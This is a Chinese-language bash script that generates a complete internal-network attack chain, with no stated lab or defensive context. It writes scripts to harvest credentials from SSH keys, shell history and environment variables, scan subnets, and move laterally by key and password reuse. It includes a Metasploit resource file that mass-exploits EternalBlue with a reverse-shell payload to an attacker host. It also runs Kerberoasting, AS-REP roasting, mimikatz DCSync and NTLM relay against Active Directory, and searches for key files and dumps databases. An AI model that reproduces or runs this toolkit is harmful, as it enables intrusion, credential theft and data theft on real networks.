#!/bin/bash
# 内网渗透完整流程 - 从初始shell到域控

echo "[+] ========================================"
echo "[+] 内网渗透实战 - 完整攻击链"
echo "[+] ========================================"

# ============================================
# 阶段1: 信息收集（5分钟）
# ============================================
echo ""
echo "[+] 阶段1: 信息收集"
echo ""

cat > /tmp/info_collect.sh << 'EOF'
#!/bin/bash
# 在目标机器执行

echo "[+] 系统信息"
uname -a
hostname
id
whoami
cat /etc/os-release 2>/dev/null || cat /etc/redhat-release 2>/dev/null

echo "[+] 网络信息"
ip addr
ip route
cat /etc/resolv.conf
netstat -antlp 2>/dev/null || ss -antlp

echo "[+] 进程和服务"
ps aux | head -20
systemctl list-units --type=service 2>/dev/null | head -20

echo "[+] 凭证收集"
[ -f ~/.ssh/id_rsa ] && echo "[+] SSH密钥存在: ~/.ssh/id_rsa"
[ -f /root/.ssh/id_rsa ] && echo "[+] SSH密钥存在: /root/.ssh/id_rsa"
cat ~/.bash_history 2>/dev/null | grep -iE "password|passwd|ssh|mysql" | tail -10
env | grep -iE "pass|key|token|secret"

echo "[+] 配置文件"
find /var/www /opt /home -name "*.config" -o -name "*.env" -o -name "config.php" 2>/dev/null | head -10
EOF

echo "信息收集脚本已生成: /tmp/info_collect.sh"
echo "在目标机器执行: bash /tmp/info_collect.sh > info.txt"

# ============================================
# 阶段2: 内网扫描（10分钟）
# ============================================
echo ""
echo "[+] 阶段2: 内网扫描"
echo ""

cat > /tmp/network_scan.sh << 'EOF'
#!/bin/bash
# 在目标机器执行

echo "[+] C段存活扫描"
NETWORK=$(ip route | grep -oP '\d+\.\d+\.\d+\.\d+/\d+' | head -1 | cut -d'/' -f1 | cut -d'.' -f1-3)
echo "检测到网段: ${NETWORK}.0/24"

for i in {1..254}; do
    timeout 0.5 ping -c 1 ${NETWORK}.$i > /dev/null 2>&1 && echo "${NETWORK}.$i" &
done | sort -u > alive_hosts.txt
echo "[+] 存活主机: $(wc -l < alive_hosts.txt) 台"

echo "[+] 端口扫描（关键服务）"
nmap -p 22,80,443,3306,6379,27017,3389,445,5985,5986 -iL alive_hosts.txt --open -oN ports_scan.txt 2>/dev/null || \
for ip in $(cat alive_hosts.txt); do
    for port in 22 80 443 3306 6379 3389 445 5985; do
        timeout 1 bash -c "echo > /dev/tcp/$ip/$port" 2>/dev/null && echo "$ip:$port" &
    done
done | sort -u > open_ports.txt
EOF

echo "内网扫描脚本已生成: /tmp/network_scan.sh"

# ============================================
# 阶段3: 横向移动（15分钟）
# ============================================
echo ""
echo "[+] 阶段3: 横向移动"
echo ""

cat > /tmp/lateral_movement.sh << 'EOF'
#!/bin/bash
# SSH密钥复用
if [ -f ~/.ssh/id_rsa ]; then
    echo "[+] SSH密钥复用"
    for ip in $(cat alive_hosts.txt); do
        ssh -i ~/.ssh/id_rsa -o ConnectTimeout=3 -o StrictHostKeyChecking=no root@$ip "hostname" 2>/dev/null && \
        echo "[+] $ip - SSH成功" && \
        ssh -i ~/.ssh/id_rsa root@$ip "whoami; id" 2>/dev/null
    done
fi

# 密码复用（如果收集到密码）
if [ -f passwords.txt ]; then
    echo "[+] 密码复用测试"
    for ip in $(cat alive_hosts.txt); do
        for pass in $(cat passwords.txt); do
            sshpass -p "$pass" ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no root@$ip "hostname" 2>/dev/null && \
            echo "[+] $ip - 密码: $pass" && break
        done
    done
fi
EOF

echo "横向移动脚本已生成: /tmp/lateral_movement.sh"

# ============================================
# 阶段4: MSF内网穿透
# ============================================
echo ""
echo "[+] 阶段4: MSF内网穿透"
echo ""

cat > /tmp/msf_lateral.rc << 'EOF'
# MSF资源文件 - 内网横向

# 设置全局变量
setg LHOST 10.10.10.10
setg LPORT 4444

# 假设已有session 1
sessions -i 1

# 添加路由
run autoroute -s 192.168.1.0/24
run autoroute -s 10.0.0.0/8
route print

# 通过路由扫描
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 445,3389,5985,3306,6379
set ROUTE_THROUGH_SESSION 1
set THREADS 50
run

# SMB版本扫描
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
set ROUTE_THROUGH_SESSION 1
run

# 永恒之蓝扫描
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
set ROUTE_THROUGH_SESSION 1
set THREADS 50
run

# SOCKS代理
use auxiliary/server/socks_proxy
set VERSION 5
set SRVPORT 1080
run

# 批量利用永恒之蓝
use exploit/windows/smb/ms17_010_eternalblue
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
set ROUTE_THROUGH_SESSION 1

# 遍历目标
hosts -R
exploit -z
EOF

echo "MSF资源文件已生成: /tmp/msf_lateral.rc"
echo "执行: msfconsole -r /tmp/msf_lateral.rc"

# ============================================
# 阶段5: 域环境攻击
# ============================================
echo ""
echo "[+] 阶段5: 域环境攻击（如适用）"
echo ""

cat > /tmp/ad_attack.sh << 'EOF'
#!/bin/bash
# Windows域环境攻击

# BloodHound收集
echo "[+] BloodHound数据收集"
SharpHound.exe -c All,GPOLocalGroup -d domain.local --zipfilename bh_$(date +%Y%m%d).zip

# Kerberoasting
echo "[+] Kerberoasting"
GetUserSPNs.py domain.local/user:password -dc-ip 192.168.1.1 -request -outputfile kerberoast.txt

# AS-REP Roasting
echo "[+] AS-REP Roasting"
GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt

# 黄金票据（需要krbtgt hash）
echo "[+] 黄金票据"
mimikatz.exe "lsadump::dcsync /domain:domain.local /user:krbtgt"
# mimikatz.exe "kerberos::golden /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /user:administrator /id:500 /ptt"

# NTLM Relay
echo "[+] NTLM Relay"
ntlmrelayx.py -tf targets.txt -smb2support -socks
EOF

echo "域攻击脚本已生成: /tmp/ad_attack.sh"

# ============================================
# 阶段6: 数据收集
# ============================================
echo ""
echo "[+] 阶段6: 数据收集"
echo ""

cat > /tmp/data_collection.sh << 'EOF'
#!/bin/bash
# 数据收集

echo "[+] 敏感文件搜索"
find / -name "*.key" -o -name "*.pem" -o -name "*.p12" -o -name "*password*" 2>/dev/null | head -20
find /var/www /opt /home -name ".env" -o -name "config.php" -o -name "*.config" 2>/dev/null

echo "[+] 数据库导出"
# MySQL
mysql -u root -p'password' -e "SHOW DATABASES;" 2>/dev/null
# 导出数据
mysqldump -u root -p'password' database_name > dump.sql 2>/dev/null

# Redis
redis-cli -h 192.168.1.100 -a password "KEYS *" 2>/dev/null

echo "[+] 凭证收集（Windows）"
# hashdump
# load kiwi
# kiwi_cmd "sekurlsa::logonpasswords"
EOF

echo "数据收集脚本已生成: /tmp/data_collection.sh"

# ============================================
# 完整流程总结
# ============================================
echo ""
echo "[+] ========================================"
echo "[+] 完整流程总结"
echo "[+] ========================================"
echo ""
echo "1. 信息收集: bash /tmp/info_collect.sh"
echo "2. 内网扫描: bash /tmp/network_scan.sh"
echo "3. 横向移动: bash /tmp/lateral_movement.sh"
echo "4. MSF穿透: msfconsole -r /tmp/msf_lateral.rc"
echo "5. 域攻击: bash /tmp/ad_attack.sh (如适用)"
echo "6. 数据收集: bash /tmp/data_collection.sh"
echo ""
echo "[+] 所有脚本已生成在 /tmp/ 目录"
echo "[+] ========================================"
